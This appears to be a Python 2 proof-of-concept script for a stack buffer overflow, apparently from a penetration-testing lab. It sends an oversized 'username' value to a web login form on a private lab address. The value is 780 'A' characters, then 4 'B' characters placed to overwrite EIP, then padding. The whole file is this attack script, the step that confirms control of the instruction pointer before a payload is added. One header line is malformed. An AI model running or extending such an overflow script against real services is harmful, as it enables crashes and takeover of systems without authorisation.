#!/usr/bin/python
import socket
import time
import sys

size = 100
try:
    print "\nSending evil buffer "
    filter = "A" * 780
    eip = "B" * 4
    buffer_end = "C" * 16
    inputBuffer = filter + eip + buffer_end
    content = "username=" + inputBuffer + "&password=A"
    sock_buffer = "POST /login HTTP/1.1\r\n"
    sock_buffer += "Host: 192.168.196.10\r\n"
    sock_buffer += "User - Agent: Mozilla / 5.0 (X11; Linux_86_64; rv: 52.0) Gecko / 20100101Firefox / 52.0\r\n"
    sock_buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    sock_buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    sock_buffer += "Referer: http://192.168.196.10/login\r\n"
    sock_buffer += "Connection: close\r\n"
    sock_buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    sock_buffer += "Content-Length: " + str(len(content)) + "\r\n"
    sock_buffer += "\r\n"
    sock_buffer += content
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.196.10", 80))
    s.send(sock_buffer)
    s.close()
    print "\nDone!"
except:
    print "Could not connect!"
